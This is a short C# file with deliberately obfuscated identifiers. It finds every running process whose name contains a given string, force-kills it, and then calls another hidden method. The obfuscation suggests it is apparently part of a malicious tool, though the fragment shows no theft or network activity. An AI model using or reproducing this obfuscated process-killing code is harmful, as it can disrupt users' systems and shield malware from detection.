using System;
using System.Diagnostics;

namespace YzTymtbtgFABHvJvj;

public class tzANCLdrUOWu
{
	public static bool qQahtvukcxY(Process HQuULwsAPHZvS, string yDrIRSVkRKlfJw)
	{
		try
		{
			return HQuULwsAPHZvS.ProcessName.ToLower().Contains(yDrIRSVkRKlfJw.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void nJBunZFqxPrxa(string DVHEPzBbiWTGB, string tYTuySjweZkF)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (qQahtvukcxY(process, DVHEPzBbiWTGB.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					eqCksjvMyn.pQsIRxMQfXRA();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
